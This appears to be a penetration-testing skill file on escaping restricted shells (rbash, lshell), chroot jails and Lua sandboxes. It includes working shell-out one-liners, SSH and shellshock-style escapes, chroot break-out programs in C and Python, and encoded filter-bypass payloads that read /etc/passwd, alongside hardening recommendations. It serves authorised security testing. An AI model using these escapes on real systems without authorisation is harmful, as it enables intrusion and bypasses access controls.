---
name: bypassing-restricted-shells
description: Escaping restricted shells (rbash, rksh, lshell), chroot jails, and language sandboxes (Lua, Python)
  during authorized engagements, plus bypassing command filters and bad-character / WAF restrictions to obtain arbitrary
  command execution from a constrained shell environment.
domain: cybersecurity
subdomain: linux-hardening
tags:
- penetration-testing
- linux
- restricted-shell
- jailbreak
- chroot
version: '1.0'
author: Krishna Kumar (xalgord)
license: Apache-2.0
---

# Bypassing Restricted Shells

## When to Use

- After landing in a restricted shell (`rbash`, `rksh`, `lshell`, custom menu shells) where `cd`, `/`, `>`, and PATH changes are blocked
- When a chroot jail confines the filesystem view and you need to reach the real root FS
- When command-injection input is filtered (spaces stripped, keywords blocked, character allowlists)
- When stuck inside a language sandbox (Lua, Python) reachable from an application
- During post-exploitation when an interactive shell needs to be upgraded from a limited binary

## Critical: Techniques Most Often Missed

Restricted-shell assessments fail when the tester tries one escape, hits a block, and assumes the jail is solid. Always run the full matrix.

- **GTFOBins shell-out from allowed binaries.** Any binary the restricted shell lets you run may have a `Shell` function. Check `vi`/`vim`, `less`, `more`, `man`, `awk`, `find`, `
ed`, `ftp`, `nmap`, `python`, `perl`, `ssh` against https://gtfobins.github.io.
  - How to CONFIRM: run the GTFOBins one-liner and check `id`/`echo $0`. From `vi`: `:set shell=/bin/sh` then `:shell`. From `less`: `!/bin/sh`. From `awk`: `awk 'BEGIN {system("/bin/sh")}'`.
- **SSH command injection at login (never reaches the restricted shell).** The restricted shell only applies after a normal login; the SSH command channel runs before it.
  - How to CONFIRM: `ssh -t user@<IP> bash` returns an interactive bash; or `ssh user@<IP> -t "bash --noprofile -i"`; or the shellshock-style `ssh user@<IP> -t "() { :; }; sh -i"`.
- **PATH / declare tricks inside rbash.** `rbash` blocks `PATH=...` assignment but not every avenue.
  - How to CONFIRM: `declare -n PATH; export PATH=/bin; bash -i` drops a full bash; or `BASH_CMDS[shell]=/bin/bash; shell -i`.
- **Chroot double-chroot escape (when root inside the jail).** Two chroots cannot coexist; creating a new one while your CWD stays outside it puts you on the real FS.
  - How to CONFIRM: compile and run `break_chroot.c` (mkdir + chroot + 1000× `chdir("..")` + `chroot(".")`), then `ls /` shows the host root.
- **Filter/bad-char bypass for command injection.** A blocked space or keyword rarely means safe input.
  - How to CONFIRM: `cat${IFS}/etc/passwd` works where `cat /etc/passwd` is filtered; `who$@ami` returns the user where `whoami` is blocked.

## Workflow

### Step 1: Enumerate the Jail

Map exactly what is allowed before trying escapes.

```bash
echo $SHELL          # rbash, lshell, etc.
echo $PATH           # which dirs hold runnable binaries
env; export          # exported funcs / env that can be abused
pwd; echo /home/*    # can wildcards list dirs the shell won't cd to?
compgen -c           # all commands available (or: declare builtins)
echo $PATH | tr ':' '\n'   # then ls each dir for GTFOBins candidates
```

### Step 2: Shell Out via an Allowed Binary (GTFOBins)

Search GTFOBins for any binary you can execute that has a "Shell" property.

```text
# Editors / pagers
vi    -> :set shell=/bin/sh   then   :shell
vim   -> :!/bin/sh
less  -> !/bin/sh             (or v to drop into $EDITOR)
man   -> !/bin/sh
more  -> v -> :!/bin/sh

# Scripting languages
awk 'BEGIN {system("/bin/sh")}'
find . -exec /bin/sh \; -quit
perl -e 'exec "/bin/sh";'
python -c 'import os; os.system("/bin/bash")'
ssh -o ProxyCommand=';sh 0<&2 1>&2' x   # ssh ProxyCommand shell-out
```

### Step 3: Escape Without a Helper Binary (rbash builtins)

```bash
# These work from inside rbash where PATH= is blocked
declare -n PATH; export PATH=/bin; bash -i
BASH_CMDS[shell]=/bin/bash; shell -i
SHELL=/bin/bash

# Reach an interactive shell over SSH (runs before the restricted shell)
ssh -t user@<IP> bash
ssh user@<IP> -t "bash --noprofile -i"
ssh user@<IP> -t "() { :; }; sh -i"
```

### Step 4: Break Out of a chroot Jail (root inside jail)

```c
// break_chroot.c — gcc break_chroot.c -o break_chroot ; upload + run
#include <sys/stat.h>
#include <stdlib.h>
#include <unistd.h>
int main(void){
    mkdir("chroot-dir", 0755);
    chroot("chroot-dir");          // CWD stays OUTSIDE the new chroot
    for(int i=0;i<1000;i++) chdir("..");
    chroot(".");                   // now anchored at the real FS root
    system("/bin/bash");
}
```

```python
# Python equivalent if a python interpreter is reachable
import os
os.mkdir("chroot-dir"); os.chroot("chroot-dir")
for i in range(1000): os.chdir("..")
os.chroot("."); os.system("/bin/bash")
```

Other chroot escapes: mount the root device (`/`) into a dir inside the jail then chroot into it; mount `procfs` and chroot into `/proc/1/root`; pass an outside-the-jail file descriptor over a Unix domain socket. The `chw00t` tool automates several of these.

### Step 5: Defeat Command / Character Filters

```bash
# Spaces blocked -> IFS / brace expansion
cat${IFS}/etc/passwd
cat$IFS/etc/passwd
{cat,/etc/passwd}
X=$'cat\x20/etc/passwd'&&$X

# Keyword/letter filters -> quotes, backslashes, wildcards, vars
'w'h'o'a'm'i ; "w"h"o"a"m"i        # quote insertion
\u\n\a\m\e\ \-\a                   # backslash insertion -> uname -a
/usr/bin/who*mi ; /usr/bin/n[c]   # wildcard / char-class substitution
who$@ami ; p${u}i${u}n${u}g       # $@ and uninitialized vars as no-ops

# Encoded execution (avoid bad chars entirely)
bash<<<$(base64 -d<<<Y2F0IC9ldGMvcGFzc3dk)
cat `xxd -r -p <<< 2f6574632f706173737764`     # -> /etc/passwd
$(tr "[A-Z]" "[a-z]"<<<"WhOaMi")               # case transform -> whoami
$(rev<<<'imaohw')                              # reverse -> whoami
```

### Step 6: Escape Language Sandboxes

```lua
-- Lua: call os.execute without dots, or drop to a debug shell
load(string.char(0x6f,0x73,0x2e,0x65,0x78,0x65,0x63,0x75,0x74,0x65,0x28,0x27,0x6c,0x73,0x27,0x29))()
print(rawget(string,"char")(0x41,0x42))   -- call lib funcs without "."
debug.debug()                              -- interactive lua shell
```

## Key Concepts

| Concept | Description |
|---------|-------------|
| **Restricted shell** | `rbash`/`rksh`/`lshell` that block `cd`, `/` in command names, redirection, and PATH edits |
| **chroot jail** | Filesystem confinement; "not intended to defend against privileged users" — root can escape |
| **GTFOBins shell-out** | Abuse of an allowed binary's documented shell/exec function to spawn `/bin/sh` |
| **IFS substitution** | Using `${IFS}` to replace filtered spaces in command-injection payloads |
| **Bad-char avoidance** | base64/hex/`tr`/`rev` transforms to deliver commands without filtered characters |
| **SSH command channel** | Commands passed to `ssh` execute before the login (restricted) shell starts |

## Tools & Systems

| Tool | Purpose |
|------|---------|
| **GTFOBins** | Lookup of Unix binaries and their shell/exec escape functions |
| **chw00t** | Automates multiple chroot break-out techniques |
| **Bashfuscator** | Generates obfuscated bash payloads to bypass filters |
| **rbash / lshell / rksh** | The restricted shells being assessed |
| **gcc / python / perl** | Compile or run chroot break-out helpers when present in the jail |

## Common Scenarios

### Scenario 1: rbash with vi allowed
A jump host drops users into `rbash` but permits `vi` for editing. `:set shell=/bin/sh` then `:shell` yields an unrestricted shell, bypassing the menu entirely.

### Scenario 2: chroot SFTP jail running as root
A misconfigured SFTP chroot leaves the service root inside the jail. Uploading and executing `break_chroot.c` reaches the host filesystem and exposes `/etc/shadow`.

### Scenario 3: Web command injection with space filter
A diagnostics endpoint blocks spaces. `cat${IFS}/etc/passwd` and `{cat,/etc/passwd}` both bypass the filter and read the file.

### Scenario 4: Lua-backed application console
A device exposes a Lua console with a keyword blocklist. `load(string.char(...))()` decodes and runs `os.execute('...')`, and `debug.debug()` opens a full Lua REPL.

## Output Format

```
## Restricted Shell Escape Finding

**Vulnerability**: Restricted Shell / Jail Escape
**Severity**: High
**Entry Point**: rbash session for user 'operator' on jump01

### Escape Technique
Allowed binary `vi` exposed a shell function:
  :set shell=/bin/sh
  :shell

### Proof
$ echo $0        -> /bin/sh   (was -rbash)
$ id             -> uid=1004(operator) ...
$ cat /etc/passwd  (previously blocked) -> full file

### Impact
Full unrestricted command execution as 'operator'; restricted shell
provides no security boundary. Combined with local privesc, leads to root.

### Recommendation
1. Remove shell-capable binaries (vi, less, awk, find) from the restricted PATH
2. Set noexec/nosuid on writable mounts; forbid PATH and SHELL overrides
3. Use ForceCommand + internal-sftp for SFTP-only accounts, never a chroot run as root
4. Prefer allowlisted command wrappers over rbash for menu shells
```
